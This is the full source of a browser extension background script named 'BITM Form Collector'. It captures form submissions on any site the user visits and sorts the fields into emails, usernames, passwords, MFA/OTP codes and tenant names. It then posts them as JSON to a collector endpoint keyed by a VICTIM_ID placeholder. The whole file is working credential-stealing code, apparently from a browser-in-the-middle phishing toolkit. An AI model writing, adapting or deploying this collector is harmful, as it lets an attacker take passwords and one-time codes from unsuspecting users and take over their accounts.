console.log('BITM Form Collector - Background Script Loaded');

const COLLECTOR_URL = 'http://127.0.0.1:8080/VICTIM_ID';
const MAX_FIELDS = 64;
const MAX_KEY_LENGTH = 128;
const MAX_VALUE_LENGTH = 512;
const EVENT_WINDOW_MS = 60 * 1000;
const MAX_EVENTS_PER_WINDOW = 120;
const eventTimestamps = [];

browser.runtime.onMessage.addListener((message, sender) => {
    if (message?.type !== 'bitm:user-form-submit') return undefined;
    return handleUserFormSubmission(message, sender).catch((error) => {
        console.error('Failed to process user form submission:', error);
    });
});

async function handleUserFormSubmission(message, sender) {
    const sourceUrl = sender.url || message.url;
    if (!sourceUrl || sourceUrl.startsWith(`${COLLECTOR_URL}/`)) return;

    let parsedUrl;
    try {
        parsedUrl = new URL(sourceUrl);
    } catch {
        return;
    }

    const fields = extractFields(message.fields);
    if (Object.keys(fields).length === 0) return;
    if (!allowEvent()) return;

    await sendEvent({
        event_type: 'form_submission',
        timestamp: new Date().toISOString(),
        url: sourceUrl,
        hostname: parsedUrl.hostname,
        title: 'Form data captured',
        description: getFieldSummary(fields),
        payload: {
            fields,
            field_count: Object.keys(fields).length,
            field_types: [...new Set(Object.values(fields).map((field) => field.type))],
            user_initiated: true,
            form_action: message.action || sourceUrl,
            form_method: message.method || 'GET',
            page_title: String(message.title || '').slice(0, 256)
        }
    });
}

function allowEvent() {
    const now = Date.now();
    const cutoff = now - EVENT_WINDOW_MS;
    while (eventTimestamps.length > 0 && eventTimestamps[0] <= cutoff) {
        eventTimestamps.shift();
    }
    if (eventTimestamps.length >= MAX_EVENTS_PER_WINDOW) return false;
    eventTimestamps.push(now);
    return true;
}

function extractFields(data) {
    const flattened = flattenValues(data);
    const fields = {};

    for (const [key, value] of Object.entries(flattened)) {
        const normalizedKey = key.trim().slice(0, MAX_KEY_LENGTH);
        const normalizedValue = String(value ?? '').trim();
        if (!normalizedKey || !normalizedValue) continue;

        fields[normalizedKey] = {
            type: classifyField(normalizedKey, normalizedValue),
            value: normalizedValue.slice(0, MAX_VALUE_LENGTH)
        };

        if (Object.keys(fields).length >= MAX_FIELDS) break;
    }

    return fields;
}

function flattenValues(value, prefix = '', result = {}, depth = 0) {
    if (Object.keys(result).length >= MAX_FIELDS || depth > 3 || value == null) {
        return result;
    }

    if (Array.isArray(value)) {
        for (let index = 0; index < value.length && index < MAX_FIELDS; index += 1) {
            flattenValues(value[index], prefix ? `${prefix}.${index}` : String(index), result, depth + 1);
        }
        return result;
    }

    if (typeof value === 'object') {
        for (const [key, nestedValue] of Object.entries(value)) {
            if (Object.keys(result).length >= MAX_FIELDS) break;
            const nestedKey = prefix ? `${prefix}.${key}` : key;
            flattenValues(nestedValue, nestedKey, result, depth + 1);
        }
        return result;
    }

    if (prefix) result[prefix] = value;
    return result;
}

function classifyField(key, value) {
    const lowKey = key.toLowerCase();
    const lowValue = String(value).toLowerCase();

    if (lowKey.includes('email') || lowKey.includes('mail') || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(lowValue)) {
        return 'email';
    }
    if (lowKey.includes('user') || lowKey.includes('login') || lowKey.includes('account')) {
        return 'username';
    }
    if (lowKey.includes('pass') || lowKey.includes('pwd') || lowKey.includes('secret')) {
        return 'password';
    }
    if (lowKey.includes('otp') || lowKey.includes('code') || lowKey.includes('2fa') || lowKey.includes('mfa')) {
        return 'mfa';
    }
    if (lowKey.includes('tenant') || lowKey.includes('domain') || lowKey.includes('company')) {
        return 'tenant';
    }
    return 'other';
}

function getFieldSummary(fields) {
    return [...new Set(Object.values(fields).map((field) => field.type))].join(', ');
}

async function sendEvent(payload) {
    try {
        const response = await fetch(`${COLLECTOR_URL}/events`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

    } catch (err) {
        console.error('Failed to send form event:', err.message);
    }
}
